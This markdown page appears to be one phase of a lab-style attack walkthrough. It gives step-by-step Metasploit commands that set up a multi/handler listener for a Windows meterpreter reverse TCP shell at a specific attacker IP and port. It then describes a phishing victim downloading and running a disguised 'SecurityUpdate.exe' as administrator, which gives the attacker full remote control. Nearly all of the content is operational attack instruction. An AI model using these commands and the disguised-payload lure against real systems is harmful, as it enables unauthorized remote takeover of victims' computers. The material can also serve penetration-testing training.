# 💥 Phase 4: Exploitation

## 🎯 Objective

Trigger the execution of the malicious payload and establish a connection back to the attacker’s machine.

---

## 🧰 Step 1: Launch Metasploit Framework

Start the **Metasploit console** on the attacker’s machine:

```bash
msfconsole
```

Once loaded, configure the handler to catch the incoming reverse shell:

```bash
use exploit/multi/handler
```

---

## ⚙️ Step 2: Configure the Exploit

Match the handler settings to the payload created during the Weaponization phase:

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.19.19.134
set LPORT 4444
run
```

📌 **Explanation of Settings**

| Setting   | Description                                |
| --------- | ------------------------------------------ |
| `PAYLOAD` | Specifies the type of reverse shell to use |
| `LHOST`   | IP address of the attacker's machine       |
| `LPORT`   | Listening port for incoming connections    |

---

## 🧑‍💻 Victim Interaction

The victim performs the following steps:

1. Opens the phishing email and clicks the **shortened URL**.
2. Downloads `SecurityUpdate.exe` from the attacker’s Python server.
3. Executes the file using **Command Prompt with administrator privileges** or with just **Right-Click** on the file and **Run as Administrator**.

---

## 🔄 Establishing the Connection

Once executed, the payload silently:

* Initiates a **reverse TCP session** to `10.19.19.134:4444`.
* Connects back to the attacker's Metasploit listener.
* Opens a **Meterpreter shell**, granting the attacker full remote control of the victim's Windows machine.

✅ At this point, the **exploitation is successful**, and the attacker has established command-line access for further actions.
